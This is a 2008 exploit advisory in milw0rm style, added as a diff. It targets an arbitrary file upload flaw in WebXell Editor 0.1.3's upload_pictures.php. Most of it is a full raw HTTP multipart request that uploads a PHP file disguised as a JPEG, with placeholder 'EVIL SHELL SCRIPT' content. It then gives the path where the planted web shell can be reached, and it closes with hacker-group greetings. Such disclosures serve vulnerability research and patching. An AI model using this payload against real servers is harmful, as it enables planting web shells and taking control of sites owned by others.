@@ -1,0 +1,72 @@
+===========================================================================
+  WebXell Editor (upload_pictures.php) Arbitrary File Upload Vulnerability
+===========================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 7 July 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : WebXell Editor
+ VERSION     : 0.1.3
+ VENDOR	     : N/A
+ DOWNLOAD    : http://downloads.sourceforge.net/webxelleditor/webXell-0.1.3.zip
+#####################################################
+
+--- Arbitrary File Upload ---
+
+	This Vulnerability can upload malicious files direct to web server.
+Use Web proxy (Webscarab,etc..) to intercept data.
+
+[+] Upload Path: http://[Target]/[webxell_path]/upload_pictures.php
+
+ [-] POC Exploit:
+
+POST http://192.168.24.25/webxell/upload_pictures.php HTTP/1.1
+Host: 192.168.24.25
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://192.168.24.25/webxell/index.php?file=test.xml
+Cookie: storyread[1]=1; PHPSESSID=a663694e586aba414a1b9fb79917891f
+Content-Type: multipart/form-data; boundary=---------------------------278151583918669
+Content-length: 241
+
+-----------------------------278151583918669
+Content-Disposition: form-data; name="updFile"; filename="phpbug.php"
+Content-Type: img/jpeg
+
+<?php
+EVIL SHELL SCRIPT
+?>
+-----------------------------278151583918669--
+
+
+[+] Shell Script: ***You can intercept file's name with Web proxy that tell the real name***
+
+ [-] Position: http://[target]/[webxell_path]/upload/[Evil_File]
+
+
+##################################################################
+  Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  
+##################################################################
+
+# milw0rm.com [2008-07-07]
